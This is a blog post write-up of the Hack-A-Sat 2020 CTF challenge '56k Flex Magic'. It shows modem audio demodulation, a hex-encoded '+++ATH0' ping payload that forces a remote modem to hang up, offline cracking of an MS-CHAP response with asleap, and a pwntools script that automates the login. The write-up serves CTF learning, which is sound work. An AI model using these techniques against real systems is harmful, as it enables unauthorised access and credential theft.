---
layout: post
title: 'Hack-A-Sat CTF Part 2'
date: '2020-05-25T00:00:00.000-00:00'
author: Keramas
tags: [ctf]
---

One of the challenges I focused a lot of time on during Hack-A-Sat CTF was the `56k Flex Magic` challenge. We made it pretty far on this one, but couldn't figure out the final piece of the puzzle that we needed to finish it up during the time frame of the CTF.

This was such an awesome challenge--especially due to the nostalgia of it revolving around 56k modem tech--and I couldn't stop thinking about it afterwards, so I went back and managed to solve it based on a slight hint at what to look for where we got stuck. 

## 56k Flex Magic - Communication Systems 

<img src = "/assets/images/hackasat/56kmodem_challenge.png">

Connecting to the challenge server over the provided IP and port, we are given the following information:

```
---=== MY SERVER ===---
Phone #: 248-555-0158
Username: hax
Password: hunter2

* Modem implements a (very small) subset of 'Basic' commands as
  described in the ITU-T V.250 spec (Table I.2)

---=== THEIR SERVER ===---

Ground station IP: 93.184.216.34
Ground station Phone #: 472-XXX-XXXX ...?
Username: ?
Password: ?

* They use the same model of modem as mine... could use +++ATH0
  ping of death
* It'll have an interactive login similar to my server
* Their official password policy: minimum requirements of
  FIPS112 (probably just numeric)
    * TL;DR - section 4.1.1 of 'NBS Special Publication 500-137'
    * 
```

Additionally, we are provided with the following .wav file: 

<audio controls>
  <source src="https://raw.githubusercontent.com/Keramas/keramas.github.io/master/assets/images/hackasat/recording.wav" type="audio/wav">
</audio>

Nostalgic sounds!

Before diving into the wav file, we connect to the challenge server and are greeted by a `/dev/ttyACM0`. 

<img src = "/assets/images/hackasat/56kmodem0.png">

This is a 56k modem connection, and thus we can use very basic commands in order to dial up and connect to other hosts using `atdt <phonenumber>`.
So putting this to use, we dial up to the number provided in the challenge text.

<img src = "/assets/images/hackasat/56kmodem1.png">

We are greeted with a fake shell environment with extremely limited functionality and not much to go on really. We will set this aside for the moment as it is apparent we will need to attack the ground station in some way.

Since we don't know the ground station's full phone number, we can first analyze the .wav in order to extract the full phone number. This can be done using Python or just simply listening and trying to replicate the tones heard. 

As a result, the number is `472-555-0161`

Now that we have the phone number, we can try to dial in; however, when doing so we are greeted with a busy signal.

<img src = "/assets/images/hackasat/56kmodem2.png">

The server gives us a hint about how to deal with this: ping of death. We have limited commands on the shell we get when connecting to the provided server, but we do have the ping command! 

We can issue a hex encoded ping command to send the ping of death which will force a disconnect.

Converting the command to hex:

```
+++ATH0  ->  2B2B2B415448300D
```

Ping command:
```bash
ping -p 2B2B2B415448300D 93.184.216.34
```

<img src = "/assets/images/hackasat/56kmodem3.png">

Now that the ground station's line should no longer be busy, we can dial it up and we are presented with another login screen for SATNET.

<img src = "/assets/images/hackasat/56kmodem4.png">

We do not know the login information, however, so we will need to discover this somehow.

Doing a deeper dive into the .wav file, we find that we can use Minimodem to demodulate the sound file to dump some interesting data. Setting the baudrate to 300 with the "-a" flag for all carrier, there are some very noticeable strings present:

```bash
minimodem -f recording.wav -a 300
```

<img src = "/assets/images/hackasat/56kmodem5.png">

From the above, we can see the ground station name (`KYGRNDSTTNA8F6CZ9`) as well as what appears to be a username: `rocketman2255`.

Based on the password policy hint and reading the FIPS documentation, the minimum password is a 4-character numeric password. While possible to straight up bruteforce this by iterating through the 10,000 different digit combinations, when connecting to the ground station host, it takes a significant amount of time to establish a connection for each login attempt, and after about 10 tries, the server will drop the connection. 

With this said, bruteforcing is not the way to do this--though, I suppose you can just leave a script running to reconnect and keep trying--but it will take quite a while.

This is exactly where my team got stuck and we were unable to find the password before the CTF finished despite a ton of effort from several members. 

Despite not solving it during the CTF timeframe, I went back with a clue that there is a CHAP packet present as authentication was taking place over PPP. 

With this in mind, we can separate the carrier streams between the client and the server, and put into a hexdump so we can analyze it. 

We can separate by looking at a spectrograph and figure out the range of each, and then use minimodem with these values to break it apart

Server:
```
minimodem -f recording.wav 300 -M 1170 -S 940 2>/dev/null | xxd
```
Client:
```
minimodem -f recording.wav 300 -M 1850 -S 1650 | xxd
```

The result is the following:

Server:
<img src = "/assets/images/hackasat/56kserver_dump.png">

Client:
<img src = "/assets/images/hackasat/56kclient_dump.png">

Checking out RFCs for PPP and MS-CHAP authentication (https://tools.ietf.org/html/rfc2433), I got a good grasp of the packet construction. Since it is using MS-CHAP we can hunt down the CHAP header of 0xc223 and read out the needed values to construct a valid hash.

This is a simple break down of a CHAP packet over PPP:

```
| CHAP header | Code | Identifier | Length | Value Length | Value | Name | 
```

- Code: This is a value between 1-4 which signifies a challenge (1), a response (2), a success (3), and a failure (4).
- The identifier is a value that is unique for the challenge and response is only a single byte.
- Length is the entire length of the data of the packet.
- Value length is the length of the value...
- The value is what will be our challenge hash and response hash that we will need to construct our CHAP hash along with the identifier.
- Name is what is sent to identify the remote hosts.

Using MS-CHAP, however, the value field is broken down even further:
- 24 bytes for LAN MAN challenge response
- 24 bytes for Win NT challenge response
- 1 byte for a flag specifying the "Use Win NT"


Once again looking at the hexdump we can extract the following for our authentication handshake. I've separated the bytes into the above breakdown to easy referencing.

Challenge:
```
c223 | 01 | 00 | 001a | 08 | 2e23517660054b59 | 47524e445354544e41384636435a39 
```
Response:
```
c223 | 02 | 00 | 0043 | 31 | 000000000000000000000000000000000000000000000000f2bd84da 305d1c16f3e7f0799ef220bba3865bbecc44508901 | 726f636b65746d616e32323535
```
Success:
```
c223 | 03 | 00 | 0004 |
```

Based on this we can see that it is using NT hashes and not LANMAN (good for them), and we will take the challenge and response and feed it into the `asleap` (https://github.com/joswr1ght/asleap) tool in order to crack the challenge and response hash with a list of 4-digit PINs. We just need to remove the zeroes and the 0x01 at the end of the response challenge.

```
keramas@ubuntu:/opt/asleap$ ./asleap -C 2e:23:51:76:60:05:4b:59 -R f2:bd:84:da:30:5d:1c:16:f3:e7:f0:79:9e:f2:20:bb:a3:86:5b:be:cc:44:50:89 -W ~/Documents/4digit.txt 
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using wordlist mode with "/home/keramas/Documents/4digit.txt".
    hash bytes:        116b
    NT hash:           a42e790f0db7adf43d19e6b5b3ec116b
    password:          4940
```
With all the puzzle pieces in our hands, we can use the following script to automate the entire process and successfully log into SATNET for our flag:

```python
from pwn import *
import itertools

target = "modem.satellitesabove.me"
port = 5052

r = remote(target,port)
r.recvline()
r.sendline("ticket{india69067zulu:GHLHKwRgquLWIVVDZJsQQmkDAuyRF3dxATpm5TIqHZRj21iBODBJCX6SgBjd1KXwXw}")

r.recv()
log.info("Dialing...")
r.sendline("atdt 2485550158")

log.info("Entering first set of credentials.")
r.recvuntil("Username: ")
r.sendline("hax")
r.recvuntil("Password: ")
r.sendline("hunter2")

r.recvuntil("$ ")

log.info("Ping of death to force hangup.")
r.sendline("ping -p 2B2B2B415448300D 93.184.216.34")

r.recvuntil("$ ")
r.sendline("exit")

r.recvuntil("NO CARRIER")

log.info("Dialing second number.")
r.sendline("atdt 4725550161")

# Credentials extracted from the .wav file
username = "rocketman2255"
password = "4940"

log.info("Waiting for connection to login...")
   
r.recvuntil("Username: ")
r.sendline(username)
r.recvuntil("Password: ")

r.sendline(password)
r.interactive()
```

Running this code, we successfully access SATNET and get our flag!

<img src = "/assets/images/hackasat/56kmodemsolved.png">